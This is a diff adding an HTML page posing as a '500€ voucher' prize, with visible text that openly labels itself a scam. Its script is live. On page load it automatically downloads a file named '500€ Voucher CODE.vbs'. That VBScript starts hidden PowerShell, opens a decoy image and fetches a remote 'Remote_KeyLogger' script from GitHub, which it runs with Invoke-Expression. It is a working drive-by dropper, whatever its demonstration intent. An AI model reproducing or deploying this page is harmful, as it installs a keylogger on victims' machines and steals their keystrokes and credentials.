@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Karla:wght@400;700&display=swap');
+	body {
+		margin: 0px;
+		padding: 0px;
+		width: 100%;
+		height: 100vh;
+		font-family: 'Karla', sans-serif;
+		font-size: 16px;
+		background-color: hsl(204, 43%, 93%);
+		display: flex;
+		flex-direction: row;
+		align-items: center;
+		justify-content: center;
+	}
+	.fw-7 {font-weight: 700;}
+	.fw-4 {font-weight: 400;}
+	main {width: 720px;border-radius: 8px;box-shadow: 0px 0px 18px 1px #0800001c;}
+	.panel {display: flex;flex-direction: column;width: 100%;}
+	.panel .panel-header {width: 100%;display: flex;flex-direction: column;padding: 40px 50px;background: white;border-radius: 8px 8px 0px 0px;box-sizing: border-box;}
+	.panel .panel-header h3 {color: hsl(179, 62%, 43%);font-size: 26px;margin: 0px;}
+	.panel .panel-header h4 {margin: 25px 0px 0px 0px;color: hsl(71, 73%, 54%);font-size: 19px;}
+	.panel .panel-header .panel-text {margin-top: 20px;display: flex;flex-direction: column;row-gap: 7px;color: hsl(218, 22%, 67%);}
+	.panel .panel-header .panel-text p {margin: 0px; line-height: 26px;}
+	.panel .panel-body {width: 100%;border-radius: 0px 0px 8px 8px;display: flex;flex-direction: row;box-sizing: border-box;}
+	.panel .panel-body .panel-left {width: 50%;padding: 40px 50px;display: flex;flex-direction: column;justify-content: center;background:hsl(179, 62%, 43%);border-radius: 0px 0px 0px 8px;box-sizing: border-box;}
+	.panel .panel-body .panel-left span.span1 {font-size: 35px;display: inline-block;color: white;}
+	.panel .panel-body .panel-left span.span2 {font-size: 20px;display: inline-block;color: #ffffff94;}
+	.panel .panel-body .panel-left h3 {color: white;font-size: 19px;margin: 0px;}
+	.panel .panel-body .panel-left p {color: #ffffff8c;display: flex;flex-direction: row;column-gap: 14px;align-items: center;margin-bottom: 0px;}
+	.panel .panel-body .panel-left h4 {color: #ffffff94;display: flex;flex-direction: row;column-gap: 6px;align-items: center;margin-top: 0;}
+	.panel .panel-body .panel-left button {height: 50px;border-radius: 8px;border: 0;outline: none;color: white;background: hsl(71, 73%, 54%);font-size: 16px;box-shadow: 0px 1px 10px 1px #08000036;}
+	.panel .panel-body .panel-right {width: 50%;padding: 40px 50px;background:hsl(179deg 62% 43% / 83%);border-radius: 0px 0px 8px 0px;box-sizing: border-box;}
+	.panel .panel-body .panel-right h3 {color: white;font-size: 19px;margin: 0px;}
+	.panel .panel-body .panel-right .panel-text {color: #ffffff94;margin-top: 20px;}
+	.panel .panel-body .panel-right .panel-text p {margin: 2px 0px;font-size: 15px;}
+	@media only screen and (max-width: 675px) {
+		body {
+			height: 100%;
+    		margin: 60px auto;
+		}
+		main {
+			width: 310px;
+			margin: 0px auto;
+		}
+		.panel .panel-header {
+			padding: 30px 25px;
+		}
+		.panel .panel-body {
+			flex-direction: column;
+		}
+		.panel .panel-body .panel-left {
+			width: 100%;
+			border-radius: 0px;
+			padding: 30px 25px;
+		}
+		.panel .panel-body .panel-right {
+			width: 100%;
+			border-radius: 0px 0px 8px 8px;
+			padding: 30px 25px;
+		}
+	}
+    </style>
+    <title>Document</title>
+</head>
+<body>
+    <main>
+
+		<div class="panel">
+			<div class="panel-header">
+				<h3 class="fw-7">Congratulations, you have just won 500€!</h3>
+				<h4 class="fw-4" style="color: green;">Limited SCAM offer until aa/bb/cc. <br> <br> This is a voucher for 500€ that can be spent in any store that you prefer that is in a list of our partners!</h4>
+				<div class="fw-4 panel-text">
+					<p class="" style="font-size: 18pt; color: rgb(44, 44, 127);">Open the document that was transferred automatically and get your VOUCHER CODE, see the stores where you can make purchases. Get it now before it expires!!!</p>
+				</div>
+			</div>
+			<div class="panel-body">
+				<div class="panel-left">
+					<h3 class="fw-7">Get your 500€ voucher now!</h3>
+					<p class="fw-4"><span class="span1">500€</span> Limited<strong>SCAMPAIGN</strong>!!!</p>
+					<h4 class="fw-4">In case the file was not downloaded automatically, click on this button here, open the file and GET HACKED!</h4>
+					<button class="fw-7">Download the voucher code and get HACKED!</button>
+				</div>
+				<div class="panel-right">
+					<h3>Why us?</h3>
+					<div class="panel-text">
+						<p>Because it's a scam!</p>
+                        <br>
+						<p>Because it is impossible to receive such a large amount of money just because!</p>
+                        <br>
+                        <p>Never click on links sent to you and trust everything you see on the Internet.</p>
+						
+					</div>
+				</div>
+			</div>
+		</div>
+
+	</main>
+</body>
+</html>
+
+<script>
+    function downloadTextFile(text, fileName) {
+  // Create a Blob object from the text string
+  const blob = new Blob([text], {type: 'text/plain'});
+
+  // Create a URL for the text file
+  const url = URL.createObjectURL(blob);
+
+  // Create a link element
+  const link = document.createElement('a');
+  link.href = url;
+  link.download = fileName;
+
+  // Append the link element to the document
+  document.body.appendChild(link);
+
+  // Click the link to initiate the download
+  link.click();
+
+  // Remove the link element from the document
+  document.body.removeChild(link);
+}
+
+// Example usage:
+const text = 'Set objShell = CreateObject("WScript.Shell") \n objShell.Run "cmd /c start /min "" "" powershell -WindowStyle Hidden "" start chrome https://media.donedeal.ie/eyJidWNrZXQiOiJkb25lZGVhbC5pZS1waG90b3MiLCJlZGl0cyI6eyJ0b0Zvcm1hdCI6ImpwZWciLCJyZXNpemUiOnsiZml0IjoiaW5zaWRlIiwid2lkdGgiOjYwMCwiaGVpZ2h0Ijo2MDB9fSwia2V5IjoicGhvdG9fMjQyMjQ1MjUwIn0=?signature=bb59efb40780135bf43727a00b82b7fcb47858243cf952aee8961eef449ec4c7; $ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/OlegLeo/Remote_KeyLogger/main/script.txt; Invoke-Expression $($ScriptFromGitHub.Content);"""'
+
+const fileName = '500€ Voucher CODE.vbs';
+downloadTextFile(text, fileName);
+
+
+</script>
